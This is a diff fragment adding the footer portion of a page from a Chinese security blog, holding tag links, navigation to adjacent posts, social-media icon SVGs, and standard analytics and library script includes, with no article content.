+          <a href="https://lcx.cc/tags/sock/">sock</a>
+          <a href="https://lcx.cc/tags/sql/">SQL</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8B%E8%AF%95/">测试</a>
+          <a href="https://lcx.cc/tags/%E7%AB%AF%E5%8F%A3/">端口</a>
+          <a href="https://lcx.cc/tags/%E6%B5%81%E9%87%8F/">流量</a>
+          <a href="https://lcx.cc/tags/%E6%A8%A1%E5%9D%97/">模块</a>
+          <a href="https://lcx.cc/tags/%E6%89%AB%E6%8F%8F/">扫描</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%BB%9C/">网络</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E6%BA%90%E7%A0%81/">源码</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/3893/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">当下最流行的3大黑客seo优化手法大曝光</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/3891/">
+            <span class="next-text nav-default">利用Teensy进行EM410x卡模拟以及暴力破解EM410X类门禁系统可行性猜想</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
